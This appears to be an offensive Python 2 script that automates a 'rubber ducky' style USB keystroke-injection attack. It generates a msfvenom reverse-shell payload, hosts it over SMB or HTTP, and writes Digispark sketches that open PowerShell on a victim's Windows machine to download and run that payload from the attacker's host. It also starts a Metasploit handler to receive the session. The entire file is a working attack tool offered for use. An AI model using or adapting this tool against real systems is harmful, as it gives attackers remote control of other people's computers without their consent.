#!/bin/python
#===============================================================================#
#										#
#				!! Created by Sharon !!				#
#			Follow me on Instagram:					#
#				https://www.instagram.com/zero.overflow/	#
#			My GitHub:						#
#				https://www.github.com/zer0overflow/		#
#										#
#################################################################################

import sys, os, threading
from impacket import smbserver
reset = '\033[32;0;0m'
pos = '\033[32;1;40m[+]' + reset
info = '\033[33;1;40m[!]' + reset
neg = '\033[31;1;40m[-]' + reset

def kill():
        op = os.popen('lsof -i:445').read()
        op = op.split('\n')
        for line in op:
                if 'python' in line:
                        pid = line.split(' ')[2]
                        os.system('kill -9 %s' % pid)
	print reset

def banner():
	os.system('clear')
	print('\n\n\033[1;31;5m' + open('grafitti.txt', 'r').read())
	print(reset)

def usage():
	banner()
	print("""
	Usage:
		python %s [HOST] [PORT] [PAYLOAD] [OUTPUT FILE] [format]
""" % sys.argv[0])

def create_ino(code):
        f = open('keystroke_inject.ino', 'w')
        cc = 'keystroke_inject.ino'
        f.write(code)
        f.close()
        print(pos + " File saved to %s" % cc)
        print(pos + " Open Arduino >> File >> Open >> %s" % cc)

def start_server(type):
                if 'server' in os.listdir(os.getcwd()):
                        pass
                else:
                        try:
                                os.mkdir('server')
                        except Exception as e:
                                print(info + ' Error %s continuing...' % e)
                                pass
                os.system('mv %s server/' % mal)
                os.chdir('server/')
                if type == 'SMB':
                        create_ino(smbcode)
                        print(info + ' Starting the Samba Server...')
                        server = smbserver.SimpleSMBServer()
			server.addShare('MAL', os.getcwd())
                        try:
                                server.start()
                        except Exception as e:
                                print(neg + ' Error! %s ' % e)
                else:
                        create_ino(httpcode)
                        os.system('python -m SimpleHTTPServer 3456')

def main():
	global mal, host, port, httpcode, smbcode

        try:
                host = sys.argv[1]
                port = sys.argv[2]
                payload = sys.argv[3]
                mal = sys.argv[4]
                format = sys.argv[5]
        except:
                usage()
                exit()
        try:
                payload = payload.split(' ')[0]
                opt = ' '.join(payload.split(' ')[0:])
        except:
                pass
        banner()
        print(info + ' Generating payload')
        os.popen('msfvenom -p %s -f %s LHOST=%s  LPORT=%s  -o %s' % (payload, format, host, port, mal))
        httpcode = '''
        /*
         *          Created by Sharon Shaju
         *          Follow me on Instagram
         *                https://www.instagram.com/zero.overflow
         *          My GitHub
         *                https://www.github.com/zer0overflow
        */
        #include "DigiKeyboard.h"

        void setup() {
          pinMode(1, OUTPUT);
          DigiKeyboard.delay(1000);
          DigiKeyboard.sendKeyStroke( KEY_R,MOD_GUI_LEFT);
          DigiKeyboard.delay(500);
          DigiKeyboard.println("powershell");
          DigiKeyboard.delay(500);
          DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
          DigiKeyboard.println("$WebClient = New-Object System.Net.WebClient");
          DigiKeyboard.println("$WebClient.DownloadFile(\\"http://%s:3456/%s\\",\\"%s\\")");
          DigiKeyboard.delay(1000);
          DigiKeyboard.println("start %s");
          DigiKeyboard.println("exit");
          digitalWrite(1, HIGH);
        }

        void loop() {

        }
        ''' % (host, mal, mal, mal)
	smbcode = '''

/*
 *          Created by Sharon Shaju
 *          Follow me on Instagram
 *                https://www.instagram.com/zero.overflow
 *          My GitHub
 *                https://www.github.com/zer0overflow
*/
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke( KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("\\\\\\\\%s\\\\mal\\\\%s\\\\");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(80);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(40);
  digitalWrite(1, HIGH);
}
void loop() {
  digitalWrite(1, HIGH);
  digitalWrite(0, LOW);
  delay(100);
  digitalWrite(1, LOW);
  digitalWrite(0,HIGH);
  delay(100);
}
''' % (host, mal)
        if raw_input(info + ' Do you want to start a metasploit stager and file hosting?[y/n] ').lower() == 'y':
                rc_file = open('msf.rc', 'w')
                cmd = 'use multi/handler\n' + \
                        'set LHOST 0.0.0.0\n' + \
                        'set LPORT %s\n' % port+ \
                        'set PAYLOAD %s\n' % payload + \
                        'run -j'
                rc_file.write(cmd)
                rc_file.close()
                print(pos + " RC File created and saved to msf.rc . run \"msfconsole -r msf.rc\"")
                #print(filename)
                thread = threading.Thread(target=start_server,args=("SMB",))
                thread.start()
                os.system('msfconsole -r msf.rc')
		while 1:
			try:
				pass
			except KeyboardInterrupt:
				print(info  + ' Quitting...')
				kill()
				quit(-1)
        else:
		print reset
                exit()

if __name__ == '__main__':
        main()
